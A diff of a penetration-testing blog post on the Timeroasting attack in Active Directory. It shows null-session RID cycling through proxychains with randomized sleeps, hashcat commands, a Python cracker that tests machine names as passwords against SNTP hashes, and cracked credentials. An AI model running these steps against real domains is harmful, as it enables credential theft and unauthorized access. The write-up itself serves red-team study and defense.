@@ -71,11 +71,11 @@ Having grabbed around 2k machine accounts we then thought of a way of getting th
 The first one being a null authentication RPC endpoint to cycle through the RIDs (can be done with `rpcclient` or `lookupsid.py` from [Impacket](https://github.com/fortra/impacket)):
 
 ```terminal?prompt=$
-$ rpcclient -U '%' 192.168.1.11 -c lsaquery
+~$ rpcclient -U '%' 192.168.1.11 -c lsaquery
 Domain Name: NIGHTCITY
 Domain Sid: S-1-5-21-2513662962-556311701-4231341873
 
-$ for rid in `seq 1000 10000`
+~$ for rid in `seq 1000 10000`
 for> do proxychains4 rpcclient -U '%' 192.168.1.11 -c "lookupsids S-1-5-21-2513662962-556311701-4231341873-$rid" |& grep -v unknown | grep '\$ ('
 for> sleep $((3+RANDOM % 5))
 for> done
@@ -95,7 +95,7 @@ S-1-5-21-2513662962-556311701-4231341873-1208 NIGHTCITY\LEXINGTON$ (1)
 Note that RID Cycling can easily be performed [in combination with NTLM Relay](https://x.com/snovvcrash/status/1506286522655461386) 😉
 
 ```terminal?prompt=$
-$ proxychains4 lookupsid.py -no-pass -domain-sids 192.168.1.11 | grep '\$ (SidTypeUser'
+~$ proxychains4 lookupsid.py -no-pass -domain-sids 192.168.1.11 | grep '\$ (SidTypeUser'
 ```
 
 However, it wasn't the case for us, so we headed towards the second obvious way to get the machine names — reverse DNS lookups for a couple of internal subnets:
@@ -114,17 +114,17 @@ done
 Now, when we collected the hostnames, we can either compile the beta version of hashcat to utilize [the `-m31300` mode](https://github.com/hashcat/hashcat/issues/3629):
 
 ```terminal?prompt=$
-$ git clone https://github.com/hashcat/hashcat && cd hashcat
-$ git checkout 5236f3bd7 && make
+~$ git clone https://github.com/hashcat/hashcat && cd hashcat
+~$ git checkout 5236f3bd7 && make
 
-$ python3
+~$ python3
 >>> with open('hostnames.txt') as f:
 ...   hostnames = f.read().splitlines()
 >>> with open('hostnames.txt', 'w') as f:
 ...   f.writelines(f'{x.lower()[:14]}\n' if len(x) >= 15 else f'{x.lower()[:-1]}\n' for x in hostnames)
 ...
 
-$ ./hashcat -m31300 -O -a0 -w3 --session=sntp -o sntp.out sntp.in hostnames.txt
+~$ ./hashcat -m31300 -O -a0 -w3 --session=sntp -o sntp.out sntp.in hostnames.txt
 ```
 
 Or use a trivial Python script. Imho, hashcat is an overkill for such a small-wordlist brute force, so I went for the second option:
@@ -134,23 +134,29 @@ Or use a trivial Python script. Imho, hashcat is an overkill for such a small-wo
 import queue
 import hashlib
 import threading
-from multiprocessing import cpu_count
 from argparse import ArgumentParser
+from multiprocessing import cpu_count
 
-def brute_force_worker(hash_queue, wordlist, result_queue):
+def brute_force_worker(hash_queue, result_queue, wordlist=None):
+    if wordlist is None:
+        user_as_password = True
+    else:
+        user_as_password = False
+
     while not hash_queue.empty():
         try:
             line = hash_queue.get_nowait()
-            user, hash_type, hash_value, salt = parse_hash_entry(line)
+            user, _, hash_value, salt = parse_hash_entry(line)
+
+            if user_as_password:
+                wordlist = [user.lower().strip('$')[:14]]
 
             for password in wordlist:
                 nthash_bytes = hashlib.new('md4', password.encode('utf-16le')).digest()
                 salt_bytes = bytes.fromhex(salt)
-
                 if hashlib.md5(nthash_bytes + salt_bytes).hexdigest() == hash_value:
                     result_queue.put((user, password))
                     break
-
         except queue.Empty:
             break
 
@@ -162,12 +168,9 @@ def parse_hash_entry(line):
     except ValueError as e:
         print(f'[!] Error parsing line: {line}')
 
-def main(hashes_file, wordlist_file, thread_count=4):
-    with open(hashes_file) as f:
+def main(hashes, wordlist=None, thread_count=4):
+    with open(hashes) as f:
         hashes = f.read().splitlines()
-
-    with open(wordlist_file) as f:
-        wordlist = f.read().splitlines()
 
     hash_queue = queue.Queue()
     for line in hashes:
@@ -175,9 +178,13 @@ def main(hashes_file, wordlist_file, thread_count=4):
 
     result_queue = queue.Queue()
 
+    if wordlist is not None:
+        with open(wordlist) as f:
+            wordlist = [w.lower().strip('$')[:14] for w in f.read().splitlines()]
+
     threads = []
     for _ in range(thread_count):
-        thread = threading.Thread(target=brute_force_worker, args=(hash_queue, wordlist, result_queue))
+        thread = threading.Thread(target=brute_force_worker, args=(hash_queue, result_queue, wordlist))
         threads.append(thread)
         thread.start()
 
@@ -186,12 +193,13 @@ def main(hashes_file, wordlist_file, thread_count=4):
 
     while not result_queue.empty():
         user, password = result_queue.get()
-        print(f'[+] {user}:{password}')
+        print(f'[+] {user}$:{password}')
 
 if __name__ == '__main__':
     parser = ArgumentParser()
     parser.add_argument('hashes_file', help='File containing hashes to crack')
-    parser.add_argument('wordlist_file', help='File containing passwords to test')
+    parser.add_argument('-wf', '--wordlist-file', help='File containing passwords to test. If used, all the passwords will be tested against '
+                                                       'every hash. Otherwise, use "COMP:FMT$HASH$SALT" format for lines in hashes file')
     parser.add_argument('-t', '--threads', type=int, default=cpu_count(), help=f'Number of threads (default: {cpu_count()})')
     args = parser.parse_args()
 
@@ -201,12 +209,12 @@ if __name__ == '__main__':
 On a default 4 cores Kali VM 2k wordlist brute force session took 4,5 sec (expected due to the low complexity of hashing algorithms) which gave the desired initial access computer account:
 
 ```terminal?prompt=$
-$ wc -l sntp.in hostnames.txt
+~$ wc -l sntp.in hostnames.txt
   1859 sntp.in
   1859 hostnames.txt
   3718 total
-$ time python3 crack_sntp.py sntp.in hostnames.txt
-[+] DESKTOP-EUM3L4L:desktop-eum3l4
+~$ time python3 crack_sntp.py sntp.in -wf hostnames.txt
+[+] DESKTOP-EUM3L4L$:desktop-eum3l4
 python3 crack_sntp.py sntp.in hostnames.txt  4.52s user 0.14s system 103% cpu 4.521 total
 ```
 
@@ -235,6 +243,7 @@ function Invoke-Timeroast()
     $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
     $searcher.PropertiesToLoad.Add("objectSID") | Out-Null
     $results = $searcher.FindAll()
+    # $results = Import-Csv "sids_and_names.csv"
 
     if ($port -eq 0) {
         $client = New-Object System.Net.Sockets.UdpClient
@@ -252,10 +261,12 @@ function Invoke-Timeroast()
     while ((Get-Date) -lt $timeoutTime) {
         if ($i -lt $results.Count) {
             $sid = New-Object System.Security.Principal.SecurityIdentifier($results[$i].Properties["objectsid"][0], 0)
+            # $sid = New-Object System.Security.Principal.SecurityIdentifier($results[$i].Sid)
             $rid = [UInt32]$sid.Value.Split('-')[-1]
             $query = $NTP_PREFIX + [BitConverter]::GetBytes($rid) + [byte[]]::new(16)
             [void]$client.Send($query, $query.Length)
             $ridToSamAccountName[$rid] = $results[$i].Properties["samaccountname"][0].Trim("$")
+            # $ridToSamAccountName[$rid] = $results[$i].Name.Trim("$")
             $i++
         }
 
@@ -284,6 +295,13 @@ function Invoke-Timeroast()
 }
 ```
 
+In case of having already collected a BloodHound dump, the corresponding CSV file of SIDs and sAMAccountNames can be generated and imported from the PowerShell script instead of quering LDAP again:
+
+```terminal?prompt=$
+~$ echo 'Sid,Name' > sids_and_names.csv
+~$ cat 19700101000000_computers.json | jq '.data[] | select(.Properties.enabled == true) | "\(.ObjectIdentifier),\(.Properties.samaccountname)"' -r >> sids_and_names.csv
+```
+
 ![![timeroast.ps1.png](/assets/images/applicability-of-the-timeroasting-attack/timeroast.ps1.png)](/assets/images/applicability-of-the-timeroasting-attack/timeroast.ps1.png)
 {:.center-image}
 
@@ -307,7 +325,7 @@ MD5(NT-hash || NTP-response)
 Hashcat's mode 10 `md5($pass.$salt)` can be re-used in pure kernel setting (however, [optimized kernel will refuse it due to hardcoded salt length](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#what_is_the_maximum_supported_salt_length_for_optimized_kernels)) providing `--hex-wordlist` and `--hex-salt` switches to achive our goal:
 
 ```terminal?prompt=$
-$ hashcat -m10 -a0 --session=sntp -o sntp.out sntp.in nthashes.txt --hex-wordlist --hex-salt
+~$ hashcat -m10 -a0 --session=sntp -o sntp.out sntp.in nthashes.txt --hex-wordlist --hex-salt
 ```
 
 But, of course, for optimized kernel lovers, here's the modified part of `m31300_a0-optimized.cl`:
